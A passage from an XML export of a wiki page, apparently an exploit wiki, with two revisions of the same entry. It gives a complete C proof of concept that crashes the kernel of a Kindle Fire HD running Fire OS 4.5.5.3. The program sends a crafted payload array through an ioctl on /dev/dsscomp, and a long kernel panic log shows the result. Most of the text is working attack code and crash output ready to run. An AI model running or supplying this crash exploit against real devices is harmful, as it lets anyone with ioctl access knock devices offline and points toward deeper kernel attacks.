    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
崩溃日志
[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037
[  164.802459] pgd = c26ec000
[  164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000
[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM
[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[  164.834686] PC is at dev_ioctl+0x4ac/0x10c4
[  164.839416] LR is at down_timeout+0x40/0x5c
[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013
[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04
[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610
[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f
[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000
[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015
[  164.892303] 
[  164.892333] PC: 0xc0317868:
[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f
[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064
[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060
[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0
[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070
[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064
[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064
[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088
[  164.982299] 
[  164.982330] LR: 0xc006e938:
[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005
[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4
[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000
[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794
[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d
[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008
[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004
[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d
[  165.072265] 
[  165.072265] SP: 0xc25a1df0:
[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610
[  165.162353] 
[  165.162384] IP: 0xc25a1dd0:
[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001
[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.252441] 
[  165.252441] FP: 0xc25a1e84:
[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff
[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000
[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40
[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044
[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400
[  165.342346] 
[  165.342376] R6: 0xc259ff80:
[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00
[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8
[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000
[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000
[  165.432342] 
[  165.432342] R7: 0xc0a25ad0:
[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03
[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005
[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001
[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001
[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000
[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000
[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001
[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8
[  165.522186] 
[  165.522186] R9: 0xd8c0ac28:
[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148
[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000
[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000
[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda
[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000
[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24
[  165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8)
[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)
[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0
[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8
[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14
[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000
[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08
[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004
[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004
[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000
[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8
[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610
[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624
[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000
[  165.743835] Backtrace: 
[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)
[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)
[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638
[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) 
[  165.793060] Board Information: 
[  165.793060]  Revision : 0001
[  165.793060]  Serial    : 0000000000000000
[  165.793090] SoC Information:
[  165.793090]  CPU    : OMAP4470
[  165.793090]  Rev    : ES1.0
[  165.793121]  Type    : HS
[  165.793121]  Production ID: 0002B975-000000CC
[  165.793121]  Die ID    : 1CC60000-50002FFF-0B00935D-11007004
[  165.793121] 
[  165.844757] ---[ end trace aba846a2af6e75b7 ]---
[  165.850097] Kernel panic - not syncing: Fatal exception
[  165.856109] CPU0: stopping
[  165.859252] Backtrace: 
[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)
[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950
[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)
[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)
[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)
[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)
[  165.912384] fc20:                                                       c153a9f8 00000000
[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f
[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff
[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4
[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0/0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c/0x3f0)
[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0/0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50/0x58)
[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0/0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64/0x7c)
[  165.977233]  r4:d8caee3c
[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0/0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc/0x238)
[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0/0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38/0x68)
[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000
[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0/0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4/0x69c)
[  166.017761]  r4:dd243c00
[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0/0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84/0x9c)
[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0/0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0/0xf0)
[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000
[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0/0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4/0x148)
[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0/0x148) from [&lt;c01259d8&gt;] (sys_read+0x40/0x78)
[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000
[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0/0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010
[  166.091217] CPU0 PC (0) : 0xc0019b2c
[  166.095397] CPU0 PC (1) : 0xc0019b2c
[  166.099456] CPU0 PC (2) : 0xc0019b2c
[  166.103515] CPU0 PC (3) : 0xc0019b2c
[  166.107574] CPU0 PC (4) : 0xc0019b2c
[  166.111785] CPU0 PC (5) : 0xc0019b2c
[  166.115814] CPU0 PC (6) : 0xc0019b2c
[  166.119873] CPU0 PC (7) : 0xc0019b2c
[  166.124084] CPU0 PC (8) : 0xc0019b2c
[  166.128112] CPU0 PC (9) : 0xc0019b2c
[  166.132171] CPU1 PC (0) : 0xc003ee38
[  166.136352] CPU1 PC (1) : 0xc003ee54
[  166.140411] CPU1 PC (2) : 0xc003ee54
[  166.144470] CPU1 PC (3) : 0xc003ee54
[  166.148681] CPU1 PC (4) : 0xc003ee54
[  166.152709] CPU1 PC (5) : 0xc003ee54
[  166.156768] CPU1 PC (6) : 0xc003ee54
[  166.160980] CPU1 PC (7) : 0xc003ee54
[  166.165008] CPU1 PC (8) : 0xc003ee54
[  166.169067] CPU1 PC (9) : 0xc003ee54
[  166.173126] 
[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[  166.175079
&lt;/pre&gt;</text>
      <sha1>kle17a6ighdiqsi6vjdxkzqx0svuea4</sha1>
    </revision>
    <revision>
      <id>1322</id>
      <parentid>1321</parentid>
      <timestamp>2021-04-10T01:36:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1322</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="16951" sha1="kxam3u58jihjv3hxun1xgeizottyczj" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
崩溃日志
[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037
[  164.802459] pgd = c26ec000
[  164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000
[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM
[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[  164.834686] PC is at dev_ioctl+0x4ac/0x10c4
[  164.839416] LR is at down_timeout+0x40/0x5c
[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013
[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04
[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610
[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f
[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000
[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015
[  164.892303] 
[  164.892333] PC: 0xc0317868:
[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f
[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064
[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060
[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0
[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070
[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064
[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064
[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088
[  164.982299] 
[  164.982330] LR: 0xc006e938:
[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005
[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4
[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000
[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794
[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d
[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008
[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004
[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d
[  165.072265] 
[  165.072265] SP: 0xc25a1df0:
[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610
[  165.162353] 
[  165.162384] IP: 0xc25a1dd0:
[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001
[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.252441] 
[  165.252441] FP: 0xc25a1e84:
[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff
[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000
[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40
[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044
[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400
[  165.342346] 
[  165.342376] R6: 0xc259ff80:
[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00
[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8
[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000
[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000
[  165.432342] 
[  165.432342] R7: 0xc0a25ad0:
